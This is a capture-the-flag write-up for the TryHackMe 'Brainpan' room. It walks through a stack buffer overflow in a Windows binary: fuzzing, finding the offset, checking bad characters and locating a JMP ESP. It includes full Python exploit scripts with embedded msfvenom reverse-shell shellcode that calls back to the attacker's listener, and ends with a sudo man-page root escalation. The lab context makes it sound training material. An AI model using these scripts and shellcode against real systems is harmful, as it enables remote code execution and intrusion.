In this capstone we will compromise this machine:
- [https://tryhackme.com/r/room/brainpan](https://tryhackme.com/r/room/brainpan)

# Nmap scan
First of al we need to do a `nmap` scan:
```bash
nmap -T4 -A -p- HOST_IP
```
- ![[Pasted image 20250121142232.png]]
- we can see 2 ports open

So let's get a look to port `10000` in which there is a `SimpleHttpServer`


# dirsearch
We start enumerating this we server using `dirsearch`:
```bash
python3 dirsearch.py -u http://HOST_IP:10000 -e html,php -x 400,401,403
```
- ![[Pasted image 20250121142702.png]]
- we can see it found a dir `/bin`

We visit it and we can see that it contains a `.exe` file:
- ![[Pasted image 20250121142742.png]]

We download it.


## open the `.exe` in windows debugger
We will use `ImmunityDebugger` to do our analysis:
- ![[Pasted image 20250121142851.png]]
- we go on `file` -> `attach` and we put the `.exe` file


At this point we can see it opens the port `9999` so it could be equal to the binary we can find on `HOST_IP:9999`


We start to create a python script to do our analysis (in our kali linux):
```python
import sys, socket

buffer = "A" *100

while True:
	try:
		payload = buffer + '\r\n'
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('OUR_WINDOWS_IP', 9999))
		print("[+] sendinf payload\n " + str(len(buffer)))
		s.send((payload.encode()))
		s.close()
		sleep(1)
		buffer = buffer + "A"*100	
	except:
		print("The fuzzing crashed at %s bytes" % str(len(buffer)))
		sys.exit()

## we sent a payload and each time we increment the length of 100, we want to see when it crashes
```


We run it:
```bash
python3 fuzzer.py
```
- ![[Pasted image 20250121143633.png]]
- we can see that with 1000 bytes it crashes


On `Immunity debugger ` we can see that an exception occurred.
- ![[Pasted image 20250121143740.png]]
- if we are able to overwrite the `EIP` with a malicious address we can execute a malicious code
- we have a buffer overflow vulnerability here


So we reopen `Immunity debugger` in order to understand how many bytes exactly we need to perform the attack:
- ![[Pasted image 20250121143935.png]]
- we do another time `file` -> `attach`

# determine how bytes we need to perform buffer overflow
We can use `mfs` to create a pattern:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
```
- of length 1000
- ![[Pasted image 20250121144518.png]]



We copy it and put it in the script:
```python
import sys, socket

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

payload = buffer + '\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('OUR_WINDOWS_IP', 9999))

print("[+] sendinf payload\n")

s.send((payload.encode()))
s.close()

##so we are sending the pattern payload
```

We run it:
```bash
python3 fuzzer2.py
```
- ![[Pasted image 20250121144650.png]]
- we can see that `EIP` contains `35724134`


So we search the offset:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 35724134
```
- ![[Pasted image 20250121144849.png]]
- So the match is on `524`


We can check it using this script:
```python
import sys, socket

#if everything is right we must see in EIP 42424242 that are 4 B
buffer = "A" * 524 + "B" * 4  

payload = buffer + '\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('OUR_WINDOWS_IP', 9999))

print("[+] sendinf payload\n")

s.send((payload.encode()))
s.close()
```
- ![[Pasted image 20250121145058.png]]
- just remeber to re execute the `Immunity debugger`

The test is ok!

# Search for bad chars
At this point we have to search the bas characters that are not interpreted by the binary ( in order to create a shellcode that doesn't contains them ).

Otherwise we are not able to run the shellcode, since the bad chars are not considered.

We can find them here:
- [https://github.com/cytopia/badchars](https://github.com/cytopia/badchars)

So we copy  the python part and we modify the script:
```python
import sys, socket


buffer = "A" * 524 + "B" * 4  
badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

#we send the badchars
payload = buffer + badchars + '\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('OUR_WINDOWS_IP', 9999))

print("[+] sendinf payload\n")

s.send((payload.encode()))
s.close()
```


We re-execute `immunity debugger` and the run the script:
```bash
python3 badchars.py
```
- ![[Pasted image 20250121145624.png]]


Now we go on `ESP` and we click on `follow dump`:
- ![[Pasted image 20250121145648.png]]

And we can see:
- ![[Pasted image 20250121145712.png]]
We just need to look them one by one to see if there is some that are present in the script but not here.

The only bad char we have is `\x00`!

# mona 
We need mona to continue our attack!

So we run `immunity debugger` with `mona` module that does it:
- [https://github.com/corelan/mona](https://github.com/corelan/mona)
- we download it and we put it into the `PyCommands` folder inside `Immunity Debugger` application folder


At this point we run `imm debugger` and in the bottom on left we put `!mona modules`:
- ![[Pasted image 20250121150456.png]]
- ![[Pasted image 20250121150505.png]]
- There are no protection mechanisms on the binary

So now we need the exact address of the jump instruction to the return address, so we use `!mona find -s "\xff\xe4" -m brainpan.exe`
- ![[Pasted image 20250121150630.png]]

We can see one pointer to:
- ![[Pasted image 20250121150654.png]]
- `311712f3`


So we click on this button here:
- ![[Pasted image 20250121150742.png]]
- and we search for `311712f3`
	- ![[Pasted image 20250121150811.png]]

It is right we have the jump to `ESP`:
- ![[Pasted image 20250121151022.png]]


So we put a breakpoint there:
- we click `f2` on it to put the breakpoint
	- ![[Pasted image 20250121150954.png]]



So now we modify the script:
```python
import sys, socket

#we put the ESP address in order to force the execution of bad code
buffer = b"A" * 524 + b"\xf3\x12\x17\x31"  
payload = buffer  + b'\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('OUR_WINDOWS_IP', 9999))

print("[+] sendinf payload\n")

s.send(payload)
s.close()
```


We run it:
```bash
python3 attack.py
```
- ![[Pasted image 20250121151342.png]]
- it stops on the breakpoint
- so it's ok


# shellcode generation
We use:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=OUR_KALI_IP LPORT=OUR_PORT -b "\x00" -f c
```
- ![[Pasted image 20250121151734.png]]

We copy it and put it into the script:
```python
import sys, socket

#we put some NOPS if the shellcode needs more space to execute

buffer = b"A" * 524 + b"\xf3\x12\x17\x31"  + b"\x90" *32

shellcode= (b"\xdb\xd1\xd9\x74\x24\xf4\xb8\xee\xd2\xb7\x53\x5a\x31\xc9"
b"\xb1\x52\x83\xc2\x04\x31\x42\x13\x03\xac\xc1\x55\xa6\xcc"
b"\x0e\x1b\x49\x2c\xcf\x7c\xc3\xc9\xfe\xbc\xb7\x9a\x51\x0d"
b"\xb3\xce\x5d\xe6\x91\xfa\xd6\x8a\x3d\x0d\x5e\x20\x18\x20"
b"\x5f\x19\x58\x23\xe3\x60\x8d\x83\xda\xaa\xc0\xc2\x1b\xd6"
b"\x29\x96\xf4\x9c\x9c\x06\x70\xe8\x1c\xad\xca\xfc\x24\x52"
b"\x9a\xff\x05\xc5\x90\x59\x86\xe4\x75\xd2\x8f\xfe\x9a\xdf"
b"\x46\x75\x68\xab\x58\x5f\xa0\x54\xf6\x9e\x0c\xa7\x06\xe7"
b"\xab\x58\x7d\x11\xc8\xe5\x86\xe6\xb2\x31\x02\xfc\x15\xb1"
b"\xb4\xd8\xa4\x16\x22\xab\xab\xd3\x20\xf3\xaf\xe2\xe5\x88"
b"\xd4\x6f\x08\x5e\x5d\x2b\x2f\x7a\x05\xef\x4e\xdb\xe3\x5e"
b"\x6e\x3b\x4c\x3e\xca\x30\x61\x2b\x67\x1b\xee\x98\x4a\xa3"
b"\xee\xb6\xdd\xd0\xdc\x19\x76\x7e\x6d\xd1\x50\x79\x92\xc8"
b"\x25\x15\x6d\xf3\x55\x3c\xaa\xa7\x05\x56\x1b\xc8\xcd\xa6"
b"\xa4\x1d\x41\xf6\x0a\xce\x22\xa6\xea\xbe\xca\xac\xe4\xe1"
b"\xeb\xcf\x2e\x8a\x86\x2a\xb9\x75\xfe\x30\x0a\x1e\xfd\x38"
b"\x72\xbf\x88\xde\xe0\x2f\xdd\x49\x9d\xd6\x44\x01\x3c\x16"
b"\x53\x6c\x7e\x9c\x50\x91\x31\x55\x1c\x81\xa6\x95\x6b\xfb"
b"\x61\xa9\x41\x93\xee\x38\x0e\x63\x78\x21\x99\x34\x2d\x97"
b"\xd0\xd0\xc3\x8e\x4a\xc6\x19\x56\xb4\x42\xc6\xab\x3b\x4b"
b"\x8b\x90\x1f\x5b\x55\x18\x24\x0f\x09\x4f\xf2\xf9\xef\x39"
b"\xb4\x53\xa6\x96\x1e\x33\x3f\xd5\xa0\x45\x40\x30\x57\xa9"
b"\xf1\xed\x2e\xd6\x3e\x7a\xa7\xaf\x22\x1a\x48\x7a\xe7\x2a"
b"\x03\x26\x4e\xa3\xca\xb3\xd2\xae\xec\x6e\x10\xd7\x6e\x9a"
b"\xe9\x2c\x6e\xef\xec\x69\x28\x1c\x9d\xe2\xdd\x22\x32\x02"
b"\xf4")

payload = buffer + shellcode + b'\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('REMOTE_HOST_IP', 9999))

print("[+] sendinf payload\n")

s.send(payload)
s.close()
```
- in this case we attack the tryhackme host


At this point we run a listener on our kali:
```bash
nc -nvlp 7777
```



We run the script:
```bash
python3 final_attack.py
```
- ![[Pasted image 20250121152322.png]]
- and we gain a user shell

# Privilege escalation

We check the content of the folder with:
```bash
dir
```
- 
![[Pasted image 20250121152416.png]]

But we go back:
```bash
cd ..

cd ..
```

We can see:
```bash
dir
```
- ![[Pasted image 20250121152509.png]]
- we are in a linux file system but using windows binary


So we go into `/bin` and see if we can run commands:
```bash
cd bin

ls
```
- ![[Pasted image 20250121152602.png]]



So we go back and we change the payload to execute a linux shell:
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=OUR_KALI_IP LPORT=OUR_PORT -b "\x00" -f c
```
- ![[Pasted image 20250121152805.png]]

We run another time `nc` on the kali:
```bash
nc -nvlp 5555
```
- ![[Pasted image 20250121152853.png]]

>NOTE : RERUN THE TRYHACK ME MACHINE WITH DEPLOY


So we copy the new shellcode and we put it into the script:
```python
import sys, socket

#we put some NOPS if the shellcode needs more space to execute

buffer = b"A" * 524 + b"\xf3\x12\x17\x31"  + b"\x90" *32

shellcode= (b"\xdb\xc3\xbf\x81\x27\xfd\x0c\xd9\x74\x24\xf4\x5b\x33\xc9"
b"\xb1\x12\x83\xc3\x04\x31\x7b\x13\x03\xfa\x34\x1f\xf9\xcd"
b"\xe1\x28\xe1\x7e\x55\x84\x8c\x82\xd0\xcb\xe1\xe4\x2f\x8b"
b"\x91\xb1\x1f\xb3\x58\xc1\x29\xb5\x9b\xa9\x69\xed\x58\x1a"
b"\x02\xec\x60\x49\x61\x79\x81\xc1\xe3\x2a\x13\x72\x5f\xc9"
b"\x1a\x95\x52\x4e\x4e\x3d\x03\x60\x1c\xd5\xb3\x51\xcd\x47"
b"\x2d\x27\xf2\xd5\xfe\xbe\x14\x69\x0b\x0c\x56")

payload = buffer + shellcode + b'\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('REMOTE_HOST_IP', 9999))

print("[+] sendinf payload\n")

s.send(payload)
s.close()
```



We run the new script:
```bash
python3 final_attack_linux.py
```
- ![[Pasted image 20250121153124.png]]

We got a linux user shell.

We make it prettier using:
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```
- [https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell](https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell)
- ![[Pasted image 20250121153247.png]]


At this point we make make it more better:
1. push `ctrl + z`
2. write `stty raw -echo`
	1. ![[Pasted image 20250121153446.png]]
3. type `fg` and enter
	1. ![[Pasted image 20250121153453.png]]
4. type another time `fg` and enter
	1. ![[Pasted image 20250121153509.png]]
5. write `export TERM=xterm`
	1. ![[Pasted image 20250121153535.png]]


# Privilege escalation

We start with `cat .bash_history` but nothing so we use:
```bash
sudo -l
```
- ![[Pasted image 20250121153622.png]]

So we run it to see what happens:
```bash
sudo /home/anansi/bin/anansi_util
```
- ![[Pasted image 20250121153726.png]]

So we can put `network` `proclist` or `manual`
- ![[Pasted image 20250121153758.png]]

But when we use `manual` we can put a command after suh as `ls`:
- ![[Pasted image 20250121153931.png]]

And we are in the manual, if we write in it:
```bash
!/bin/bash
```
- ![[Pasted image 20250121154021.png]]

We gain a root shell:
- ![[Pasted image 20250121154037.png]]

It is similar to GTFBins because it runs `man` as sudo and so it is equal to do:
- ![[Pasted image 20250121154205.png]]

